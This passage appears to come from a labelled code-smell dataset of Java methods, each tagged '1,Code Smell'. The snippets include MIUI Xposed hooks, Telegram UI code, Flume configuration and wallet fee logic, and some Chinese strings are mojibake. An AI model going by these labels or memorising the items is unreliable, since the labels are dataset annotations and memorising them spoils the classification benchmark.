  for (  Field field : antiDefraudAppManagerFields) {
    if (field.getName().equals(""MIUI_VERSION"")) {
      MIUI_VERSION=(String)XposedHelpers.getStaticObjectField(antiDefraudAppManager,""MIUI_VERSION"");
    }
  }
  if (MIUI_VERSION == null) {
    logW(TAG,DisableUploadAppList.this.lpparam.packageName,""Can't get MIUI_VERSION."");
  }
  String uuid=null;
  final Class<?> uuidHelper=XposedHelpers.findClassIfExists(""i.b"",lpparam.classLoader);
  if (uuidHelper != null) {
    final Method[] uuidHelperMethods=uuidHelper.getDeclaredMethods();
    Method getUUID=null;
    for (    Method method : uuidHelperMethods) {
      if (method.getName().equals(""b"") && method.getParameterTypes().length == 0) {
        getUUID=method;
        break;
      }
    }
    if (getUUID != null) {
      getUUID.setAccessible(true);
      uuid=(String)getUUID.invoke(methodHookParam);
    }
 else {
      logW(TAG,DisableUploadAppList.this.lpparam.packageName,""getUUID method not found."");
    }
  }
 else {
    logW(TAG,DisableUploadAppList.this.lpparam.packageName,""uuidHelper class not found."");
  }
  JSONObject jSONObject=new JSONObject();
  jSONObject.put(""timestamp"",String.valueOf(System.currentTimeMillis() / 1000));
  jSONObject.put(""os"",MIUI_VERSION);
  jSONObject.put(""biz_id"",""virus_scan"");
  jSONObject.put(""uuid"",uuid);
  JSONArray jSONArray=new JSONArray();
  for (int i2=0; i2 < list.size(); i2++) {
    JSONObject jSONObject2=new JSONObject();
    String pkgName=null;
    String version=null;
    String sign=null;
    String appName=null;
    Object antiDefraudAppInfo=(Object)list.get(i2);
    Field[] fields=antiDefraudAppInfo.getClass().getDeclaredFields();
    for (    Field filed : fields) {
      filed.setAccessible(true);
      if (filed.getName().equals(""pkgName"")) {
        pkgName=(String)filed.get(antiDefraudAppInfo);
      }
 else       if (filed.getName().equals(""version"")) {
        version=(String)filed.get(antiDefraudAppInfo);
      }
 else       if (filed.getName().equals(""sign"")) {
        sign=(String)filed.get(antiDefraudAppInfo);
      }
 else       if (filed.getName().equals(""appName"")) {
        appName=(String)filed.get(antiDefraudAppInfo);
      }
    }
    jSONObject2.put(""pkg"",pkgName);
    jSONObject2.put(""version"",version);
    jSONObject2.put(""signature"",sign);
    jSONObject2.put(""appname"",appName);
    jSONArray.put(jSONObject2);
  }
  jSONObject.put(""content"",jSONArray);
  logI(TAG,DisableUploadAppList.this.lpparam.packageName,""Info: Intercept="" + jSONObject.toString());
  methodHookParam.setResult(null);
}",1,Code Smell
"private static int sortMetricsObject(BaseMetrics a1,BaseMetrics a2,String metricName,Field defaultField){
  try {
    Float m1=a1.getMetric(metricName);
    Float m2=a2.getMetric(metricName);
    if (m1 != null && m2 == null) {
      return -1;
    }
 else     if (m1 == null && m2 != null) {
      return 1;
    }
 else     if (m1 != null && m2 != null) {
      int val=compareObject(m2,m1);
      if (val != 0) {
        return val;
      }
    }
    Object f1=FieldUtils.readField(a1,defaultField.getName(),true);
    Object f2=FieldUtils.readField(a2,defaultField.getName(),true);
    if (f1 != null && f2 != null) {
      return compareObject(f2,f1);
    }
    if (f1 != null) {
      return -1;
    }
 else     if (f2 != null) {
      return 1;
    }
    return 0;
  }
 catch (  Exception e) {
    log.debug(""method=sortMetricsObject||metricsA={}||metricsB={}||metricName={}||defaultFieldName={}||errMsg=exception."",a1,a2,metricName,defaultField.getName(),e);
  }
  return 0;
}",1,Code Smell
"SoftwareSystemInstance parse(DeploymentNodeDslContext context,Tokens tokens){
  if (tokens.hasMoreThan(TAGS_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR);
  }
  if (!tokens.includes(IDENTIFIER_INDEX)) {
    throw new RuntimeException(""Expected: "" + GRAMMAR);
  }
  String softwareSystemIdentifier=tokens.get(IDENTIFIER_INDEX);
  Element element=context.getElement(softwareSystemIdentifier,SoftwareSystem.class);
  if (element == null) {
    throw new RuntimeException(""The software system \"""" + softwareSystemIdentifier + ""\"" does not exist"");
  }
  DeploymentNode deploymentNode=context.getDeploymentNode();
  Set<String> deploymentGroups=new HashSet<>();
  if (tokens.includes(DEPLOYMENT_GROUPS_TOKEN)) {
    String token=tokens.get(DEPLOYMENT_GROUPS_TOKEN);
    String[] deploymentGroupReferences=token.split("","");
    for (    String deploymentGroupReference : deploymentGroupReferences) {
      Element e=context.getElement(deploymentGroupReference);
      if (e instanceof DeploymentGroup) {
        deploymentGroups.add(e.getName());
      }
    }
  }
  SoftwareSystemInstance softwareSystemInstance=deploymentNode.add((SoftwareSystem)element,deploymentGroups.toArray(new String[]{}));
  if (tokens.includes(TAGS_INDEX)) {
    String tags=tokens.get(TAGS_INDEX);
    softwareSystemInstance.addTags(tags.split("",""));
  }
  if (context.hasGroup()) {
    softwareSystemInstance.setGroup(context.getGroup().getName());
    context.getGroup().addElement(softwareSystemInstance);
  }
  return softwareSystemInstance;
}
",1,Code Smell
"@SuppressWarnings(""unchecked"") public static <T>T sendGETRequest(String url,Map<String,String> params,Integer version) throws IOException, HTTPResponseException {
  StringBuilder paramBuilder=new StringBuilder();
  if (params != null) {
    for (    Map.Entry<String,String> entry : params.entrySet()) {
      paramBuilder.append(entry.getKey()).append(""="").append(URLEncoder.encode(entry.getValue(),StandardCharsets.UTF_8)).append(""&"");
    }
  }
  String paramsStr=paramBuilder.toString();
  if (!paramsStr.equals("""")) {
    paramsStr=paramsStr.substring(0,paramsStr.length() - 1);
    url=url + ""?"" + paramsStr;
  }
  URL obj=new URL(url);
  InputStream inputStream=null;
  HttpURLConnection con=null;
  try {
    con=(HttpURLConnection)obj.openConnection();
    if (version != null) {
      con.setRequestProperty(""api-version"",version + """");
    }
    int responseCode=con.getResponseCode();
    if (responseCode < STATUS_CODE_ERROR_THRESHOLD) {
      inputStream=con.getInputStream();
    }
 else {
      inputStream=con.getErrorStream();
    }
    StringBuilder response=new StringBuilder();
    try (BufferedReader in=new BufferedReader(new InputStreamReader(inputStream))){
      String inputLine;
      while ((inputLine=in.readLine()) != null) {
        response.append(inputLine);
      }
    }
     if (responseCode < STATUS_CODE_ERROR_THRESHOLD) {
      if (!isJsonValid(response.toString())) {
        return (T)response.toString();
      }
      return (T)(new JsonParser().parse(response.toString()));
    }
    throw new HTTPResponseException(responseCode,response.toString());
  }
  finally {
    if (inputStream != null) {
      inputStream.close();
    }
    if (con != null) {
      con.disconnect();
    }
  }
}",1,Code Smell
"public void bindContext(String name,int type){
  UserInfo userInfo=new UserInfo();
  userInfo.name=name;
  userInfo.uid=name.hashCode();
  userInfo.inCallTime=new Date(new Date().getTime());
  boolean isAdd=true;
  if (type == 1) {
    for (int i=0; i < Storage.getA().size(); i++) {
      if (Storage.getA().get(i).getName().compareTo(name) == 0) {
        Storage.getA().get(i).setInCallTime(new Date(new Date().getTime()));
        isAdd=false;
      }
    }
    if (isAdd) {
      Storage.getA().add(userInfo);
    }
  }
  if (type == 2) {
    for (int i=0; i < Storage.getB().size(); i++) {
      if (Storage.getB().get(i).getName().compareTo(name) == 0) {
        Storage.getB().get(i).setInCallTime(new Date(new Date().getTime()));
        isAdd=false;
      }
    }
    if (isAdd) {
      Storage.getB().add(userInfo);
    }
  }
  if (type == 3) {
    for (int i=0; i < Storage.getC().size(); i++) {
      if (Storage.getC().get(i).getName().compareTo(name) == 0) {
        Storage.getC().get(i).setInCallTime(new Date(new Date().getTime()));
        isAdd=false;
      }
    }
    if (isAdd) {
      Storage.getC().add(userInfo);
    }
  }
  beforeAdvice(userInfo.uid);
}",1,Code Smell
"@Override public void dismiss(){
  dismiss(true);
}
public void dismiss(boolean animated){
  setFocusable(false);
  dismissDim();
  if (windowAnimatorSet != null) {
    if (animated && isClosingAnimated) {
      return;
    }
    windowAnimatorSet.cancel();
    windowAnimatorSet=null;
  }
  isClosingAnimated=false;
  if (animationEnabled && animated) {
    isClosingAnimated=true;
    ViewGroup viewGroup=(ViewGroup)getContentView();
    ActionBarPopupWindowLayout content=null;
    for (int i=0; i < viewGroup.getChildCount(); i++) {
      if (viewGroup.getChildAt(i) instanceof ActionBarPopupWindowLayout) {
        content=(ActionBarPopupWindowLayout)viewGroup.getChildAt(i);
      }
    }
    if (content != null) {
      if (content.itemAnimators != null && !content.itemAnimators.isEmpty()) {
        for (int a=0, N=content.itemAnimators.size(); a < N; a++) {
          AnimatorSet animatorSet=content.itemAnimators.get(a);
          animatorSet.removeAllListeners();
          animatorSet.cancel();
        }
        content.itemAnimators.clear();
      }
    }
    windowAnimatorSet=new AnimatorSet();
    if (outEmptyTime > 0) {
      windowAnimatorSet.playTogether(ValueAnimator.ofFloat(0,1f));
      windowAnimatorSet.setDuration(outEmptyTime);
    }
 else     if (scaleOut) {
      windowAnimatorSet.playTogether(ObjectAnimator.ofFloat(viewGroup,View.SCALE_Y,0.8f),ObjectAnimator.ofFloat(viewGroup,View.SCALE_X,0.8f),ObjectAnimator.ofFloat(viewGroup,View.ALPHA,0.0f));
      windowAnimatorSet.setDuration(dismissAnimationDuration);
    }
 else {
      windowAnimatorSet.playTogether(ObjectAnimator.ofFloat(viewGroup,View.TRANSLATION_Y,AndroidUtilities.dp((content != null && content.shownFromBottom) ? 5 : -5)),ObjectAnimator.ofFloat(viewGroup,View.ALPHA,0.0f));
      windowAnimatorSet.setDuration(dismissAnimationDuration);
    }
    windowAnimatorSet.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        windowAnimatorSet=null;
        isClosingAnimated=false;
        setFocusable(false);
        try {
          ActionBarPopupWindow.super.dismiss();
        }
 catch (        Exception ignore) {
        }
        unregisterListener();
        if (pauseNotifications) {
          notificationsLocker.unlock();
        }
      }
    }
);
    if (pauseNotifications) {
      notificationsLocker.lock();
    }
    windowAnimatorSet.start();
  }
 else {
    try {
      super.dismiss();
    }
 catch (    Exception ignore) {
    }
    unregisterListener();
  }
}",1,Code Smell
"protected Object convertNumberValue(Number value,String type) throws Throwable {
  if (DataType.NUMBER.equals(type) || DataType.UNKNOWN.equals(type))   return value;
  if (value == null)   return null;
  if (DataType.STRING.equals(type))   return this._numberFormat.format(value);
 else   if (DataType.BOOLEAN.equals(type))   return (value.intValue() > 0);
 else   if (DataType.INTEGER.equals(type)) {
    if (this.ignoreBigIntegerToInteger && (value instanceof BigInteger))     return value;
 else     return value.longValue();
  }
 else   if (DataType.DECIMAL.equals(type)) {
    if (this.ignoreBigDecimalToDecimal && (value instanceof BigDecimal))     return value;
 else     return value.doubleValue();
  }
 else   if (DataType.DATE.equals(type))   return new Date(value.longValue());
 else   if (DataType.TIME.equals(type))   return new Time(value.longValue());
 else   if (DataType.TIMESTAMP.equals(type))   return new Timestamp(value.longValue());
 else   throw new DataValueConvertionException(value,type);
}",1,Code Smell
"@Override protected void before(MethodHookParam param) throws Throwable {
  activity=(Activity)param.thisObject;
}
@Override protected void before(MethodHookParam param){
  long[] jArr={0,8,4,16,128};
  if (addAll)   return;
  setLanguage(activity);
  for (int i2=0; i2 < jArr.length; i2++) {
    int getTitle=(int)XposedHelpers.callStaticMethod(findClassIfExists(""com.android.settings.connecteddevice.usb.UsbModeChooserActivity""),""getTitleMiui12"",jArr[i2]);
    if (getTitle != 0) {
      String get=(String)XposedHelpers.callMethod(param.thisObject,""getString"",getTitle);
      mode.put(get,(int)jArr[i2]);
    }
  }
  if (mode.size() == jArr.length) {
    mode.put(""USB 缃戠粶鍏变韩"",-1);
    addAll=true;
  }
  revertLanguage();
}
@SuppressLint(""WrongConstant"") @Override protected void before(MethodHookParam param){
  String action=activity.getIntent().getAction();
  if (getMode.isEmpty())   setAllMode();
  if (action == null) {
    int choose=mode.get(getMode.get(mChoose));
    if (choose != -1) {
      Object mBackend=XposedHelpers.getObjectField(param.thisObject,""mBackend"");
      if (getMode.get(mChoose).equals(""鍙嶅悜鍏呯數"")) {
        if ((boolean)XposedHelpers.callMethod(param.thisObject,""isSupportReverseCharging"")) {
          XposedHelpers.callMethod(mBackend,""setCurrentFunctions"",(long)choose);
        }
 else {
          logE(TAG,""Your phone can't reverse charging."");
        }
      }
 else {
        XposedHelpers.callMethod(mBackend,""setCurrentFunctions"",(long)choose);
      }
    }
 else     if (choose == -1) {
      Object tethering=activity.getSystemService(""tethering"");
      int end=(int)XposedHelpers.callMethod(tethering,""setUsbTethering"",true);
      logI(TAG,""tethering: "" + end);
    }
    if (modes) {
      param.setResult(null);
      activity.finish();
    }
  }
}
@Override protected void before(MethodHookParam param){
  String action=activity.getIntent().getAction();
  if (action == null) {
    param.setResult(null);
    activity.finish();
  }
}",1,Code Smell
"@Override public void invoke(PcodeOp pcode,AbsEnv inOutEnv,AbsEnv tmpEnv,Context context,Function callFunc){
  ALoc retALoc=getReturnALoc(callFunc,false);
  if (retALoc == null) {
    return;
  }
  KSet ptrKSet=getParamKSet(callFunc,0,inOutEnv);
  if (!ptrKSet.isNormal()) {
    return;
  }
  Address freeSiteAddress=getAddress(pcode);
  for (  Entry<ALoc,KSet> entry : inOutEnv.getEnvMap()) {
    KSet oldKSet=entry.getValue();
    if (!oldKSet.isNormal()) {
      continue;
    }
    JImmutableSet<AbsVal> intersection=oldKSet.getInnerSet().intersection(ptrKSet.getInnerSet());
    KSet newKSet=new KSet(oldKSet);
    if (intersection.isEmpty()) {
      continue;
    }
    for (    AbsVal oldAbsVal : intersection) {
      if (!oldAbsVal.getRegion().isHeap()) {
        continue;
      }
      Heap invalidHeap=((Heap)oldAbsVal.getRegion()).toInvalid(freeSiteAddress);
      newKSet=newKSet.remove(oldAbsVal).insert(AbsVal.getPtr(invalidHeap));
    }
    inOutEnv.set(entry.getKey(),newKSet,true);
  }
  long size=Heap.DEFAULT_SIZE;
  KSet sizeKSet=getParamKSet(callFunc,1,inOutEnv);
  if (sizeKSet.isNormal()) {
    ArrayList<Long> sizeList=new ArrayList<>();
    for (    AbsVal absVal : sizeKSet) {
      if (absVal.getRegion().isGlobal()) {
        sizeList.add(absVal.getValue());
      }
    }
    size=sizeList.isEmpty() ? size : Collections.max(sizeList);
  }
  if (size == 0) {
    return;
  }
  Address allocAddress=getAddress(pcode);
  KSet resKSet=new KSet(retALoc.getLen() * 8);
  Heap allocChunk=Heap.getHeap(allocAddress,context,size,true);
  resKSet=resKSet.insert(AbsVal.getPtr(allocChunk));
  inOutEnv.set(retALoc,resKSet,true);
}",1,Code Smell
"@Override protected void drawSignaturesToHorizontalLines(Canvas canvas,ChartHorizontalLinesData a){
  int n=a.values.length;
  int rightIndex=chartData.linesK[0] == 1 ? 1 : 0;
  int leftIndex=(rightIndex + 1) % 2;
  float additionalOutAlpha=1f;
  if (n > 2) {
    float v=(a.values[1] - a.values[0]) / (float)(currentMaxHeight - currentMinHeight);
    if (v < 0.1) {
      additionalOutAlpha=v / 0.1f;
    }
  }
  float transitionAlpha=1f;
  if (transitionMode == TRANSITION_MODE_PARENT) {
    transitionAlpha=1f - transitionParams.progress;
  }
 else   if (transitionMode == TRANSITION_MODE_CHILD) {
    transitionAlpha=transitionParams.progress;
  }
 else   if (transitionMode == TRANSITION_MODE_ALPHA_ENTER) {
    transitionAlpha=transitionParams.progress;
  }
  linePaint.setAlpha((int)(a.alpha * 0.1f * transitionAlpha));
  int chartHeight=getMeasuredHeight() - chartBottom - SIGNATURE_TEXT_HEIGHT;
  int textOffset=(int)(SIGNATURE_TEXT_HEIGHT - signaturePaint.getTextSize());
  for (int i=0; i < n; i++) {
    int y=(int)((getMeasuredHeight() - chartBottom) - chartHeight * ((a.values[i] - currentMinHeight) / (currentMaxHeight - currentMinHeight)));
    if (a.valuesStr != null && lines.size() > 0) {
      if (a.valuesStr2 == null || lines.size() < 2) {
        signaturePaint.setColor(Theme.getColor(Theme.key_statisticChartSignature,resourcesProvider));
        signaturePaint.setAlpha((int)(a.alpha * signaturePaintAlpha * transitionAlpha* additionalOutAlpha));
      }
 else {
        signaturePaint.setColor(lines.get(leftIndex).lineColor);
        signaturePaint.setAlpha((int)(a.alpha * lines.get(leftIndex).alpha * transitionAlpha* additionalOutAlpha));
      }
      a.drawText(canvas,0,i,HORIZONTAL_PADDING,y - textOffset,signaturePaint);
    }
    if (a.valuesStr2 != null && lines.size() > 1) {
      signaturePaint2.setColor(lines.get(rightIndex).lineColor);
      signaturePaint2.setAlpha((int)(a.alpha * lines.get(rightIndex).alpha * transitionAlpha* additionalOutAlpha));
      a.drawText(canvas,1,i,getMeasuredWidth() - HORIZONTAL_PADDING,y - textOffset,signaturePaint2);
    }
  }
}",1,Code Smell
"public void markMessageAsRead2(long dialogId,int mid,TLRPC.InputChannel inputChannel,int ttl,long taskId){
  markMessageAsRead2(dialogId,mid,inputChannel,ttl,taskId,true);
}
public void markMessageAsRead2(long dialogId,int mid,TLRPC.InputChannel inputChannel,int ttl,long taskId,boolean createDeleteTask){
  if (mid == 0 || ttl < 0) {
    return;
  }
  if (DialogObject.isChatDialog(dialogId) && inputChannel == null) {
    inputChannel=getInputChannel(dialogId);
    if (inputChannel == null) {
      return;
    }
  }
  long newTaskId;
  if (taskId == 0) {
    NativeByteBuffer data=null;
    try {
      data=new NativeByteBuffer(20 + (inputChannel != null ? inputChannel.getObjectSize() : 0));
      data.writeInt32(createDeleteTask ? 23 : 101);
      data.writeInt64(dialogId);
      data.writeInt32(mid);
      data.writeInt32(ttl);
      if (inputChannel != null) {
        inputChannel.serializeToStream(data);
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
    newTaskId=getMessagesStorage().createPendingTask(data);
  }
 else {
    newTaskId=taskId;
  }
  int time=getConnectionsManager().getCurrentTime();
  if (createDeleteTask) {
    getMessagesStorage().createTaskForMid(dialogId,mid,time,time,ttl,false);
  }
  if (inputChannel != null) {
    TLRPC.TL_channels_readMessageContents req=new TLRPC.TL_channels_readMessageContents();
    req.channel=inputChannel;
    req.id.add(mid);
    getConnectionsManager().sendRequest(req,(response,error) -> {
      if (newTaskId != 0) {
        getMessagesStorage().removePendingTask(newTaskId);
      }
    }
);
  }
 else {
    TLRPC.TL_messages_readMessageContents req=new TLRPC.TL_messages_readMessageContents();
    req.id.add(mid);
    getConnectionsManager().sendRequest(req,(response,error) -> {
      if (error == null) {
        TLRPC.TL_messages_affectedMessages res=(TLRPC.TL_messages_affectedMessages)response;
        processNewDifferenceParams(-1,res.pts,-1,res.pts_count);
      }
      if (newTaskId != 0) {
        getMessagesStorage().removePendingTask(newTaskId);
      }
    }
);
  }
}",1,Code Smell
"private JavaType.FullyQualified classType(ClassNode node,String signature){
  try {
    JavaType type=reflectionTypeMapping.type(node.getTypeClass());
    return (JavaType.FullyQualified)(type instanceof JavaType.Parameterized ? ((JavaType.Parameterized)type).getType() : type);
  }
 catch (  GroovyBugError|NoClassDefFoundError ignored1) {
    JavaType.Class clazz;
    clazz=new JavaType.Class(null,Flag.Public.getBitMask(),node.getName(),JavaType.Class.Kind.Class,null,null,null,null,null,null,null);
    typeCache.put(signature,clazz);
    JavaType.FullyQualified supertype=TypeUtils.asFullyQualified(type(node.getSuperClass()));
    JavaType.FullyQualified owner=TypeUtils.asFullyQualified(type(node.getOuterClass()));
    List<JavaType.Variable> fields=null;
    if (node.getFields().size() > 0) {
      fields=new ArrayList<>(node.getFields().size());
      for (      FieldNode field : node.getFields()) {
        if (!field.isSynthetic()) {
          fields.add(variableType(field));
        }
      }
    }
    List<JavaType.Method> methods=null;
    if (node.getAllDeclaredMethods().size() > 0) {
      methods=new ArrayList<>(node.getAllDeclaredMethods().size());
      for (      MethodNode method : node.getAllDeclaredMethods()) {
        if (!method.isSynthetic()) {
          methods.add(methodType(method));
        }
      }
    }
    List<JavaType.FullyQualified> interfaces=null;
    if (node.getInterfaces().length > 0) {
      interfaces=new ArrayList<>(node.getInterfaces().length);
      for (      ClassNode iParam : node.getInterfaces()) {
        JavaType.FullyQualified javaType=TypeUtils.asFullyQualified(type(iParam));
        if (javaType != null) {
          interfaces.add(javaType);
        }
      }
    }
    List<JavaType.FullyQualified> annotations=getAnnotations(node);
    clazz.unsafeSet(null,supertype,owner,annotations,interfaces,fields,methods);
    return clazz;
  }
}",1,Code Smell
"public void checkFullscreenButton(){
  if (imagesArr.isEmpty()) {
    for (int b=0; b < 3; b++) {
      fullscreenButton[b].setVisibility(View.INVISIBLE);
    }
    return;
  }
  for (int b=0; b < 3; b++) {
    int index=currentIndex;
    if (b == 1) {
      index+=1;
    }
 else     if (b == 2) {
      index-=1;
    }
    if (index < 0 || index >= imagesArr.size()) {
      fullscreenButton[b].setVisibility(View.INVISIBLE);
      continue;
    }
    MessageObject messageObject=imagesArr.get(index);
    if (!messageObject.isVideo() && !messageObject.isYouTubeVideo()) {
      fullscreenButton[b].setVisibility(View.INVISIBLE);
      continue;
    }
    boolean isYouTube=messageObject.isYouTubeVideo() && currentMessageObject != null && currentMessageObject.getId() == messageObject.getId();
    int w=isYouTube ? messageObject.messageOwner.media.webpage.embed_width : b == 0 && videoTextureView != null ? videoTextureView.getMeasuredWidth() : 0;
    int h=isYouTube ? messageObject.messageOwner.media.webpage.embed_height : b == 0 && videoTextureView != null ? videoTextureView.getMeasuredHeight() : 0;
    TLRPC.Document document=messageObject.getDocument();
    if (document != null) {
      for (int a=0, N=document.attributes.size(); a < N; a++) {
        TLRPC.DocumentAttribute attribute=document.attributes.get(a);
        if (attribute instanceof TLRPC.TL_documentAttributeVideo) {
          w=attribute.w;
          h=attribute.h;
          break;
        }
      }
    }
    if (AndroidUtilities.displaySize.y > AndroidUtilities.displaySize.x && w > h) {
      if (fullscreenButton[b].getVisibility() != View.VISIBLE) {
        fullscreenButton[b].setVisibility(View.VISIBLE);
      }
      if (isActionBarVisible) {
        fullscreenButton[b].setAlpha(1f);
      }
      float scale=w / (float)containerView.getMeasuredWidth();
      int height=(int)(h / scale);
      FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)fullscreenButton[b].getLayoutParams();
      layoutParams.topMargin=(containerView.getMeasuredHeight() + height) / 2 - AndroidUtilities.dp(48);
    }
 else {
      if (fullscreenButton[b].getVisibility() != View.INVISIBLE) {
        fullscreenButton[b].setVisibility(View.INVISIBLE);
      }
    }
    float currentTranslationX;
    if (imageMoveAnimation != null) {
      currentTranslationX=translationX + (animateToX - translationX) * animationValue;
    }
 else {
      currentTranslationX=translationX;
    }
    float offsetX;
    if (b == 1) {
      offsetX=0;
    }
 else     if (b == 2) {
      offsetX=-AndroidUtilities.displaySize.x - AndroidUtilities.dp(15) + (currentTranslationX - maxX);
    }
 else {
      offsetX=currentTranslationX < minX ? (currentTranslationX - minX) : 0;
    }
    fullscreenButton[b].setTranslationX(offsetX + AndroidUtilities.displaySize.x - AndroidUtilities.dp(48));
  }
}",1,Code Smell
"public void apply(Activity activity,FormatItem format){
  apply(activity,format,false);
}
public void apply(Activity activity,FormatItem format,boolean force){
  setContext(activity);
  if (activity == null) {
    Log.e(TAG,""Activity in null. exiting..."");
    if (mListener != null) {
      mListener.onModeCancel();
    }
    return;
  }
  if (format == null) {
    Log.e(TAG,""Can't apply mode change: format is null"");
    if (mListener != null) {
      mListener.onModeCancel();
    }
    return;
  }
  if (!isSupported()) {
    Log.e(TAG,""Autoframerate not supported. Exiting..."");
    if (mListener != null) {
      mListener.onModeCancel();
    }
    return;
  }
  if (System.currentTimeMillis() - mPrevCall < THROTTLE_INTERVAL_MS) {
    Log.e(TAG,""Throttling afr calls..."");
    if (mListener != null) {
      mListener.onModeCancel();
    }
    return;
  }
 else {
    mPrevCall=System.currentTimeMillis();
  }
  int width=format.getWidth();
  float frameRate=correctFrameRate(format.getFrameRate());
  Pair<Integer,Float> currentFormat=new Pair<>(width,frameRate);
  Log.d(TAG,String.format(""Applying mode change... Video fps: %s, width: %s, height: %s"",frameRate,width,format.getHeight()));
  syncMode(activity,width,frameRate,force);
}
",1,Code Smell
"@Override public void configure(Context context){
  String masters=context.getString(MASTER_CHANNEL);
  String transfer=context.getString(TRANSFER_CHANNEL);
  String fileMertic=context.getString(FILE_METRIC_CHANNEL);
  String slaMetric=context.getString(SLA_METRIC_CHANNEL);
  String orderMetric=context.getString(ORDER_CHANNEL);
  if (StringUtils.isEmpty(masters)) {
    throw new FlumeException(""master channel is null!"");
  }
  List<String> masterList=splitChannelName(masters);
  List<String> transferList=splitChannelName(transfer);
  List<String> fileMetricList=splitChannelName(fileMertic);
  List<String> slaMetricList=splitChannelName(slaMetric);
  List<String> orderMetricList=splitChannelName(orderMetric);
  for (  Map.Entry<String,Channel> entry : getChannelNameMap().entrySet()) {
    String channelName=entry.getKey();
    Channel channel=entry.getValue();
    if (masterList.contains(channelName)) {
      this.masterChannels.add(channel);
    }
 else     if (transferList.contains(channelName)) {
      this.transferChannels.add(channel);
    }
 else     if (fileMetricList.contains(channelName)) {
      this.agentFileMetricChannels.add(channel);
    }
 else     if (slaMetricList.contains(channelName)) {
      this.slaMetricChannels.add(channel);
    }
 else     if (orderMetricList.contains(channelName)) {
      this.orderChannels.add(channel);
    }
 else {
      this.slaveChannels.add(channel);
    }
  }
  LOG.info(""Configure channels, masters={}, orders={}, slaves={}, transfers={}, agentFileMetrics={}, slaMetrics={}"",this.masterChannels,this.orderChannels,this.slaveChannels,this.transferChannels,this.agentFileMetricChannels,this.slaMetricChannels);
}
",1,Code Smell
"private void setFeeRatePriority(Double feeRateAmt){
  Map<Integer,Double> targetBlocksFeeRates=getTargetBlocksFeeRates();
  Integer targetBlocks=getTargetBlocks(feeRateAmt);
  if (targetBlocksFeeRates.get(Integer.MAX_VALUE) != null) {
    Double minFeeRate=targetBlocksFeeRates.get(Integer.MAX_VALUE);
    if (minFeeRate > 1.0 && feeRateAmt < minFeeRate) {
      feeRatePriority.setText(""Below Minimum"");
      feeRatePriority.setTooltip(new Tooltip(""Transactions at this fee rate are currently being purged from the default sized mempool""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #a0a1a7cc"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.EXCLAMATION_CIRCLE);
      return;
    }
    Double lowestBlocksRate=targetBlocksFeeRates.get(TARGET_BLOCKS_RANGE.get(TARGET_BLOCKS_RANGE.size() - 1));
    if (lowestBlocksRate >= minFeeRate && feeRateAmt < (minFeeRate + ((lowestBlocksRate - minFeeRate) / 2)) && !isPayjoinTx()) {
      feeRatePriority.setText(""Try Then Replace"");
      feeRatePriority.setTooltip(new Tooltip(""Send a transaction, verify it appears in the destination wallet, then RBF to get it confirmed or sent to another address""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #7eb7c9cc"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.PLUS_CIRCLE);
      return;
    }
  }
  if (targetBlocks != null) {
    if (targetBlocks < FeeRatesSource.BLOCKS_IN_HALF_HOUR) {
      Double maxFeeRate=FEE_RATES_RANGE.get(FEE_RATES_RANGE.size() - 1).doubleValue();
      Double highestBlocksRate=targetBlocksFeeRates.get(TARGET_BLOCKS_RANGE.get(0));
      if (highestBlocksRate < maxFeeRate && feeRateAmt > (highestBlocksRate + ((maxFeeRate - highestBlocksRate) / 10))) {
        feeRatePriority.setText(""Overpaid"");
        feeRatePriority.setTooltip(new Tooltip(""Transaction fees at this rate are likely higher than necessary""));
        feeRatePriorityGlyph.setStyle(""-fx-text-fill: #c8416499"");
        feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.EXCLAMATION_CIRCLE);
      }
 else {
        feeRatePriority.setText(""High Priority"");
        feeRatePriority.setTooltip(new Tooltip(""Typically confirms within minutes""));
        feeRatePriorityGlyph.setStyle(""-fx-text-fill: #c8416499"");
        feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.CIRCLE);
      }
    }
 else     if (targetBlocks < FeeRatesSource.BLOCKS_IN_HOUR) {
      feeRatePriority.setText(""Medium Priority"");
      feeRatePriority.setTooltip(new Tooltip(""Typically confirms within an hour or two""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #fba71b99"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.CIRCLE);
    }
 else {
      feeRatePriority.setText(""Low Priority"");
      feeRatePriority.setTooltip(new Tooltip(""Typically confirms in a day or longer""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #41a9c999"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.CIRCLE);
    }
  }
}",1,Code Smell
"@Override public Xml visitTag(Xml.Tag tag,ExecutionContext ctx){
  if (isDependencyTag(groupId,artifactId) || isManagedDependencyTag(groupId,artifactId)) {
    Optional<Xml.Tag> maybeExclusions=tag.getChild(""exclusions"");
    if (maybeExclusions.isPresent()) {
      return tag.withContent(ListUtils.map((List<Content>)tag.getContent(),child -> {
        if (child instanceof Xml.Tag && ""exclusions"".equals(((Xml.Tag)child).getName())) {
          Xml.Tag e=(Xml.Tag)child;
          if (e.getContent() != null) {
            e=e.withContent(ListUtils.map(e.getContent(),child2 -> {
              if (child2 instanceof Xml.Tag && ""exclusion"".equals(((Xml.Tag)child2).getName())) {
                Xml.Tag exclusion=(Xml.Tag)child2;
                if (exclusion.getChildValue(""groupId"").map(g -> matchesGlob(g,exclusionGroupId)).orElse(false) && exclusion.getChildValue(""artifactId"").map(g -> matchesGlob(g,exclusionArtifactId)).orElse(false) && !(isEffectiveExclusion(tag,groupArtifact(exclusion)) && Boolean.TRUE.equals(onlyIneffective))) {
                  return null;
                }
              }
              return child2;
            }
));
            if (e.getContent() == null || e.getContent().isEmpty()) {
              return null;
            }
 else             if (e.getContent().stream().noneMatch(Xml.Tag.class::isInstance)) {
              return null;
            }
          }
          return e;
        }
        return child;
      }
));
    }
  }
  return super.visitTag(tag,ctx);
}",1,Code Smell
"/** 
 * Query booked topic info of groups stored in zookeeper.
 * @param groupSet query groups
 * @return group--topic map info
 */
@Override public Map<String,Set<String>> queryZKGroupTopicInfo(List<String> groupSet){
  String qryBrokerId;
